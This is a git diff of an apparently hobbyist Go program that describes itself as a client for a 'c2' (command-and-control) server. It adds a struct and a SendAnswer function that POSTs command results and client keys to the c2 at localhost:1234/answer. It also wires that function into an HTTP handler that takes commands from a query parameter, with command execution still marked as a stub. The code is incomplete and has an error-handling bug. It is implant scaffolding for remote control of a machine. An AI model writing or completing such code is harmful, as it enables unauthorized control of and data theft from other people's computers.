@@ -18,6 +18,13 @@ type Contact struct {
 	Key    string //new programm -> new individual key for autorizaiton (make with time and load main function) // ManagerKey string
 	Date   time.Time
 }
+type Answer struct {
+	IP          string
+	Command     string
+	Key_Manager string
+	Key_Client  string
+	Result      string
+}
 
 func findLocalAddress(ips []net.IP) []string {
 	//192.168.0.?
@@ -70,7 +77,7 @@ func GetIPs() []net.IP {
 	return ips
 }
 
-// port - 1234
+// port of c2 - 1234
 func main() {
 	ip_addr := flag.String("ip", "localhost", "ip addres of c2")
 	//endpoint := flag.String("endpoint", "", "endpoint c2")
@@ -111,8 +118,29 @@ func sendReadySignal(ip *string) {
 
 }
 
-//Server
+// Server
+func SendAnswer() {
+	//Before needs execute the cmd
+	fmt.Printf("\n")
+	fmt.Printf("Sending answer")
+	body := strings.NewReader(fmt.Sprintf(`
+	{
+		"Ip":"%s",
+		"Command":"%s",
+		"Key_Manager":"%s",
+		"Key_Client":"%s",
+		"Result":"%s"
+	}
+	`, "192.168.0.1", "ls -la", "nil", "123456789", "Directory list"))
 
+	resp, err := http.Post("http://localhost:1234/answer", "application/json", body)
+	if err != nil {
+		fmt.Printf("Error with post request")
+	}
+	resp.Body.Close()
+	fmt.Printf("Status: " + resp.Status + "\n")
+
+}
 func startServer() {
 	fmt.Printf("Server started")
 	http.HandleFunc("/cmd", func(w http.ResponseWriter, r *http.Request) {
@@ -124,6 +152,9 @@ func startServer() {
 		cmd := r.URL.Query().Get("m")
 
 		fmt.Printf(cmd)
+
+		//exec the command
+		go SendAnswer()
 	})
 
 	http.ListenAndServe(":5555", nil)
